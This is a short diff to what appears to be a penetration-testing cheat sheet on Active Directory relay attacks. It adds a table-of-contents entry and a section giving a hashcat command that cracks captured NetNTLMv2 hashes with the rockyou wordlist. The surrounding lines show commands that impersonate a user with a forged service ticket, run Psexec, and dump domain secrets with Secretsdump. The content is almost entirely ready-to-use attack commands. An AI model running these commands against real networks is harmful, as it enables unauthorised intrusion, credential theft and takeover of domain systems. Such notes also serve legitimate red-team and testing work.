@@ -11,6 +11,7 @@
     * [LDAP Relay with Mitm6](#LDAP-Relay-with-Mitm6)
   * [LDAPS Relaying](#LDAPS-Relaying)
     * [Resource Based Constrained Delegation Webclient Attack](#Resource-Based-Constrained-Delegation-Webclient-Attack)
+* [Crack with Hashcat](#Crack-with-Hashcat)
 - https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
 
 ## Poisoning
@@ -251,4 +252,9 @@ getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -imper
 Export KRB5CCNAME=administrator.ccache
 python3 Psexec.py -k -no-pass <TARGET FQDN>
 python3 Secretsdump.py -k <TARGET FQDN>
+```
+
+## Crack with Hashcat
+```
+hashcat -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt -w3 -O
 ```
